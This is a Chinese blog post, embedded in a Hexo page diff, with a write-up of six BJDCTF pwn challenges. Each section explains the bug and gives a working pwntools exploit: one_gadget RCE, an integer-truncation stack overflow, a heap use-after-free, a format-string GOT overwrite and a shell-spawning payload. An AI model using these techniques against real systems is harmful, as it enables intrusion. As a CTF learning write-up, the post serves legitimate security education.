@@ -1,0 +1,1348 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="writeup,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="木头的小木屋" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="BJDCTF的writeup，前几道题目都比较友好。">
+<meta name="keywords" content="writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BJDCTF-writeup">
+<meta property="og:url" content="wood1314.github.io/year/03/22/ckur4f4bw0003rc15otzgt00b/index.html">
+<meta property="og:site_name" content="木头的小木屋">
+<meta property="og:description" content="BJDCTF的writeup，前几道题目都比较友好。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="/22/ckur4f4bw0003rc15otzgt00b/1.png">
+<meta property="og:image" content="/22/ckur4f4bw0003rc15otzgt00b/2.png">
+<meta property="og:image" content="/22/ckur4f4bw0003rc15otzgt00b/3.png">
+<meta property="og:image" content="/22/ckur4f4bw0003rc15otzgt00b/4.png">
+<meta property="og:image" content="/22/ckur4f4bw0003rc15otzgt00b/6.png">
+<meta property="og:updated_time" content="2020-03-22T11:49:27.760Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BJDCTF-writeup">
+<meta name="twitter:description" content="BJDCTF的writeup，前几道题目都比较友好。">
+<meta name="twitter:image" content="/22/ckur4f4bw0003rc15otzgt00b/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="wood1314.github.io/year/03/22/ckur4f4bw0003rc15otzgt00b/">
+
+
+
+
+
+  <title>BJDCTF-writeup | 木头的小木屋</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">木头的小木屋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">吃饱混天黑？</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-list"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>
+            
+            友情链接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/03/22/ckur4f4bw0003rc15otzgt00b/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wood">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="木头的小木屋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">BJDCTF-writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-22T18:40:13+08:00">
+                2020-03-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn题writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn题writeup</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>BJDCTF的writeup，前几道题目都比较友好。</p>
+<a id="more"></a>
+<h2 id="1-one-gadget"><a href="#1-one-gadget" class="headerlink" title="1 one_gadget"></a>1 one_gadget</h2><h3 id="1-1-题目分析"><a href="#1-1-题目分析" class="headerlink" title="1.1 题目分析"></a>1.1 题目分析</h3><p><img src="/22/ckur4f4bw0003rc15otzgt00b/1.png" alt><br>点开<code>init</code>函数，里面有一个泄露了<code>printf</code>的地址,是这个题目给的额外条件吧。</p>
+<p>再看题目可知我们输入了一个地址，然后就直接执行那个地址就可以getshell，是不是很厉害，这就是one_gadget.</p>
+<h3 id="1-2-关于one-gadget-更详细的介绍"><a href="#1-2-关于one-gadget-更详细的介绍" class="headerlink" title="1.2 关于one_gadget 更详细的介绍"></a>1.2 关于one_gadget 更详细的介绍</h3><p><code>one-gadget</code> 是<code>glibc</code>里调用<code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code>的一段非常有用的<code>gadget</code>。在我们能够控制ip（也就是pc）的时候，用<code>one-gadget</code>来做RCE（远程代码执行）非常方便，比如有时候我们能够做一个任意函数执行，但是做不到控制第一个参数，这样就没办法调用<code>system(&quot;sh&quot;)</code>，这个时候<code>one gadget</code>就可以搞定了。</p>
+<p>我们一般用<a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">one_gadget</a>这个工具来寻找这样的gadget。</p>
+<h3 id="1-3-如何利用工具寻找one-gadget"><a href="#1-3-如何利用工具寻找one-gadget" class="headerlink" title="1.3 如何利用工具寻找one_gadget"></a>1.3 如何利用工具寻找one_gadget</h3><ol>
+<li><p>如果远程的libc版本和你本地一样，或者你想在本地试验时,先用<code>ldd 文件名</code>命令找到自己本地的<code>libc</code>目录<br><img src="/22/ckur4f4bw0003rc15otzgt00b/2.png" alt></p>
+<p> 然后再用刚才安装好的工具查看<code>libc</code>文件就可以找到<code>one_gadget</code>对于libc的偏移了。<br> <img src="/22/ckur4f4bw0003rc15otzgt00b/3.png" alt></p>
+</li>
+<li><p>如果题目给你了它远程的<code>libc</code>文件的话,直接对那个<code>libc</code>文件使用就行<br><img src="/22/ckur4f4bw0003rc15otzgt00b/4.png" alt></p>
+</li>
+</ol>
+<h3 id="1-4-对于one-gadget的一点经验"><a href="#1-4-对于one-gadget的一点经验" class="headerlink" title="1.4 对于one_gadget的一点经验"></a>1.4 对于one_gadget的一点经验</h3><ul>
+<li>那个红色<code>constraints</code>就是调用这个<code>gadget</code>需要满足的条件,一般64位的很好满足，32位的基本用不了。</li>
+<li>一个用不了可以多试几个后面的。</li>
+<li>前期栈题可能用到的不多，后面堆题经常用来作为劫持<code>malloc_hook</code>的内容，也可以配合<code>realloc_hook</code>来调整栈环境使得满足<code>one_gadget</code>的利用条件。<h3 id="1-5-exp"><a href="#1-5-exp" class="headerlink" title="1.5 exp"></a>1.5 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#sh = process('./one_gadget')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.29.so'</span>)</span><br><span class="line">sh = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27231</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"here is the gift for u:"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">libc_base = int(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">16</span>) - libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">log.success(<span class="string">'libc_addr: '</span> + hex(libc_base))</span><br><span class="line">one_gadget = libc_base +<span class="number">0x106ef8</span></span><br><span class="line">sh.sendline(str(one_gadget))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="2-r2t3"><a href="#2-r2t3" class="headerlink" title="2 r2t3"></a>2 r2t3</h2><h3 id="2-1题目分析"><a href="#2-1题目分析" class="headerlink" title="2.1题目分析"></a>2.1题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-408h]</span></span><br><span class="line"></span><br><span class="line">  my_init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"**********************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*     Welcome to the BJDCTF!     *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[+]Ret2text3.0?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[+]Please input your name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>u);</span><br><span class="line">  name_check(&amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome ,u win!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">``` </span><br><span class="line">`read`了<span class="number">0x400</span>大小，但是并没有溢出,再让我们看下这个`name_check`</span><br><span class="line">```C</span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">name_check</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+7h] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Oops,u name is too long!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello,My dear %s"</span>, s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(&amp;dest, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读入的长度只要小于3或者大于8都会直接将程序结束，看起来好像没有漏洞，但是注意这个<code>v3</code>是个<code>__int8</code>的，也就是只有一个字节，只要我们的长度足够大，就可以将这个长度溢出到我们需要的范围，进而在<code>strcpy</code>的时候构成栈溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./r2t3')</span></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29481</span>)</span><br><span class="line">door = <span class="number">0x804858B</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x15</span></span><br><span class="line">payload += p32(door)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">237</span></span><br><span class="line">sh.recvuntil(<span class="string">"[+]Please input your name:\n"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-girlfriend"><a href="#3-girlfriend" class="headerlink" title="3 girlfriend"></a>3 girlfriend</h2><p>这道题是个uaf，挺简单，刚学堆的可以做一下这个题熟悉一下堆题。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./ydsneedgirlfriend2')</span></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28207</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"u choice :\n"</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Please input the length of her name:\n"</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"Please tell me her name:\n"</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"u choice :\n"</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">door = <span class="number">0x400D86</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#dele(1)</span></span><br><span class="line"><span class="comment">#dele(1)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">0x8</span>+p64(door))</span><br><span class="line">sh.recvuntil(<span class="string">"u choice :\n"</span>)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">sh.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0x10,'a'*0x8+p64(door))</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-r2t4"><a href="#4-r2t4" class="headerlink" title="4 r2t4"></a>4 r2t4</h2><p>一道格式化字符串题目</p>
+<h3 id="4-1题目分析"><a href="#4-1题目分析" class="headerlink" title="4.1题目分析"></a>4.1题目分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+<span class="number">0</span>h] [rbp<span class="number">-30</span>h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+<span class="number">28</span>h] [rbp<span class="number">-8</span>h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  printf(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>buf</code>可以直接溢出，有后门函数，但是开启了<code>canary</code>保护。</p>
+<p>直接把后门函数的地址写到其它函数的got表里行不通，因为后面没有别的函数调用了</p>
+<p>注意到我们触发canary的话<br><img src="/22/ckur4f4bw0003rc15otzgt00b/6.png" alt><br>也会输出一个<code>stack smashing detect ***</code>这种东西</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实就是上面这个函数，我们可以通过劫持这个函数的got来拿shell</p>
+<h3 id="4-2-exp"><a href="#4-2-exp" class="headerlink" title="4.2 exp"></a>4.2 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#sh = process('./r2t4')</span></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26917</span>)</span><br><span class="line">fini = <span class="number">0x600E18</span></span><br><span class="line">door = <span class="number">0x400626</span></span><br><span class="line">stack_ch = <span class="number">0x601018</span></span><br><span class="line">index = <span class="number">8</span></span><br><span class="line">payload = <span class="string">'bbbbb'</span></span><br><span class="line">payload += <span class="string">'%'</span> + str(<span class="number">0x626</span><span class="number">-5</span>) +<span class="string">'c'</span></span><br><span class="line">payload += <span class="string">'%'</span> + str(index) + <span class="string">'$hn'</span></span><br><span class="line">payload += p64(stack_ch)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-test"><a href="#5-test" class="headerlink" title="5 test"></a>5 test</h2><p>用od ????来读flag就行,还有类似*这样的通配符，很神奇</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">asc = <span class="string">'''</span></span><br><span class="line"><span class="string">066146 063541 032173 061067 031143 031067 026461 062470</span></span><br><span class="line"><span class="string">034146 032055 033146 026463 062142 031462 061055 031544</span></span><br><span class="line"><span class="string">062142 030467 061542 060544 076470</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(asc),<span class="number">7</span>):</span><br><span class="line">    a = asc[i:i+<span class="number">6</span>]</span><br><span class="line">    log.info(<span class="string">'a = '</span> + a)</span><br><span class="line">    num = int(a,<span class="number">8</span>)</span><br><span class="line">    h = hex(num)[<span class="number">2</span>:]</span><br><span class="line">    s = binascii.a2b_hex(h)</span><br><span class="line">    s = s[::<span class="number">-1</span>]</span><br><span class="line">    log.info(s)</span><br><span class="line">    flag += s</span><br><span class="line">    log.success(flag)</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-secret"><a href="#6-secret" class="headerlink" title="6 secret"></a>6 secret</h2><p>有一个buf那个地方可以溢出到后面的一个变量，在后面每次执行的时候那个变量指向的内容都会减一，所以可以把这个地方溢出成printf的got表,手动过16次就ok了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./secret')</span></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27147</span>)</span><br><span class="line">sh.recvuntil(<span class="string">" What's your name? ________________ #"</span>)</span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0</span>) +<span class="string">'\x40\xd0\x46'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+      <div>
+        
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+        
+      </div>
+
+    
+
+    
+
+    
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/year/03/15/ckur4f4c5000frc15s1nqy3q4/" rel="next" title="IO_FILE leak">
+                <i class="fa fa-chevron-left"></i> IO_FILE leak
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/year/03/25/ckur4f4ds004arc1516gdvu30/" rel="prev" title="内核入门">
+                内核入门 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      
+        <div id="gitment-container"></div>
+      
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Wood">
+            
+              <p class="site-author-name" itemprop="name">Wood</p>
+              <p class="site-description motion-element" itemprop="description">stay hungry stay foolish.</p>
+          </div>
